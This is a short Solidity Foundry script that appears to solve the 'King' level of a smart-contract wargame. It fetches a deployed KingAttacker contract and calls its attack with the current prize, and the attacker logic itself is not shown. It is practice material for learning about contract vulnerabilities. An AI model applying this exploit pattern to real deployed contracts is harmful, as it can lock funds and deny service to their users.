// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {DevOpsTools} from "foundry-devops/src/DevOpsTools.sol";
import {King} from "../../src/puzzles/9/King.sol";
import {KingAttacker} from "../../src/attackers/9/KingAttacker.sol";

contract KingSolution is Script {
    function run(address target) public {
        address mostRecentlyDeployedKingAttacker = DevOpsTools.get_most_recent_deployment("KingAttacker", block.chainid);
        solve(target, mostRecentlyDeployedKingAttacker);
    }

    function solve(address target, address attacker) public {
        King king = King(payable(target));
        uint256 currentPrice = king.prize();
        KingAttacker kingAttacker = KingAttacker(payable(attacker));
        vm.startBroadcast();
        kingAttacker.attack{value: currentPrice}(target);
        vm.stopBroadcast();
    }
}
